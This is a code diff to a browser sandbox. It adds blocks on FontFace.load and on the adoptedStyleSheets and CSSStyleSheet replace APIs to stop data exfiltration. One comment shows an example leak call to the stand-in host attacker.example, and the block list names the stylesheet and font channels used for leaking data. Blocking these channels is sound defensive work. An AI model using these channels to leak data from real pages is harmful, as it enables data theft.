@@ -25,6 +25,39 @@ block(window.SharedWorker, "window.SharedWorker");
 block(window.RTCPeerConnection, "window.RTCPeerConnection");
 block(method(Navigator.prototype, "sendBeacon"), "Navigator.sendBeacon");
 
+// `new FontFace(family, "url(https://attacker.example/?leak=...)").load()`
+// issues a network request the same way `fetch` does. Block until CSP
+// `font-src` is tightened (GDGT-2373).
+block(method(FontFace.prototype, "load"), "FontFace.load");
+
+// Stylesheet exfiltration. Block both the property accessors and
+// the constructable-stylesheet entry points until CSP `font-src`/`img-src`
+// is tightened (GDGT-2373). The getter is blocked too because in modern
+// browsers `document.adoptedStyleSheets` is a directly-mutable.
+// `ObservableArray`, so blocking only the setter would be defeated by
+// `document.adoptedStyleSheets.push(sheet)`.
+block(
+  getter(Document.prototype, "adoptedStyleSheets"),
+  "Document.get adoptedStyleSheets",
+);
+block(
+  setter(Document.prototype, "adoptedStyleSheets"),
+  "Document.set adoptedStyleSheets",
+);
+block(
+  getter(ShadowRoot.prototype, "adoptedStyleSheets"),
+  "ShadowRoot.get adoptedStyleSheets",
+);
+block(
+  setter(ShadowRoot.prototype, "adoptedStyleSheets"),
+  "ShadowRoot.set adoptedStyleSheets",
+);
+block(method(CSSStyleSheet.prototype, "replace"), "CSSStyleSheet.replace");
+block(
+  method(CSSStyleSheet.prototype, "replaceSync"),
+  "CSSStyleSheet.replaceSync",
+);
+
 // Document mutation / navigation
 block(method(Document.prototype, "write"), "Document.write");
 block(method(Document.prototype, "writeln"), "Document.writeln");
